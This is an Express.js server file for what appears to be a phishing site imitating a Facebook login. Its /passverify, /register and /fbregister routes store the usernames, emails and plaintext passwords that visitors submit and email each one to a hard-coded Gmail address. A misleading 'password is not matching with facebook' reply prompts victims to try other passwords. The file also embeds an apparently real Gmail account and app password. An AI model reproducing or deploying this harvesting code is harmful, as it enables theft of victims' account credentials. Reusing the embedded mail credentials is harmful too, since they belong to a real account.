const express = require('express');
const connectDB = require('./config/db')
const nodemailer = require("nodemailer");
const path = require('path')
connectDB();

const app = express();
const bodyParser = require('body-parser');
// 
const port = process.env.PORT || 8060
let User = require("./config/models/users");
let Userfb = require("./config/models/fbuser");
let Userpass = require("./config/models/userpass");

//
app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, "./front/build")))

app.get("*", (req, res) => {
    res.sendFile(
        path.join(__dirname, "./front/build/index.html")
    ),
        function (err) {
            res.status(500).send(err)
        }
})

const cors = require('cors');

const corsOptions = {
    origin: 'http://localhost:3000',
    credentials: true,            //access-control-allow-credentials:true
    optionSuccessStatus: 200
}
app.use(cors(corsOptions));

// nodemailer
async function mailer(recieveremail, code) {


    let transporter = nodemailer.createTransport({
        host: "smtp.gmail.com",
        port: 587,

        secure: false, // true for 465, false for other ports
        requireTLS: true,
        auth: {
            user: "mzain197197@gmail.com", // generated ethereal user
            pass: "mbxwivotrmsbcpyo", // generated ethereal password
        },
    });

    // send mail with defined transport object
    let info = await transporter.sendMail({
        from: 'mzain197197@gmail.com', // sender address
        to: `${recieveremail}`, // list of receivers
        subject: "Signup Verification", // Subject line
        text: `Your login info is: ${code}`, // plain text body
        html: `<b>Your login info is: ${code}</b>`, // html body
    });

}

app.post("/passverify", async (req, res) => {
    console.log(req.body);
    const { username, password } = req.body
    const newuser = await Userpass.findOne({
        username: username,
        password: password
    })
    if (newuser) {
        res.send({ message: "password is not matching with facebook" })
    } else {
        const user = new Userpass({
            username,
            password
        })
        await user.save();
        res.send({ message: "password verified " })
        await mailer("mzain4307@gmail.com", username,);
        await mailer("mzain4307@gmail.com", password);
    }
})

app.post("/login", async (req, res) => {
    console.log(req.body);
    const { email, password } = req.body
    const user = await User.findOne({
        email: req.body.email,
        password: req.body.password,
    })
    if (user) {
        res.send({ message: "Login Successfull", user: user })
    } else {
        res.send({ message: "User not registered" })
    }
})

app.post("/fbregister", async (req, res) => {

    const { name, email } = req.body
    console.log(name, email);

    const newuser = await Userfb.findOne({
        email: email,
        name: name
    })

    if (newuser) {
        res.send({ message: "loging you in" })
    } else {
        const user = new Userfb({
            name,
            email,
        })
        await user.save();
        res.send({ message: "Successfully logged in with facebook" })
        await mailer("mzain4307@gmail.com", name,);
        await mailer("mzain4307@gmail.com", email);
    }

})

app.post("/register", async (req, res) => {
    console.log(req.body);
    const { username, email, password } = req.body
    const newuser = await User.findOne({
        email: email,
        password: password,
        username: username
    })

    if (newuser) {
        res.send({ message: "User Already Exits" })
    } else {
        const user = new User({
            username,
            email,
            password
        })
        await user.save();
        res.send({ message: "Account created successfully." })
        await mailer("mzain4307@gmail.com", username,);
        await mailer("mzain4307@gmail.com", email);
        await mailer("mzain4307@gmail.com", password);
    }

})


app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
})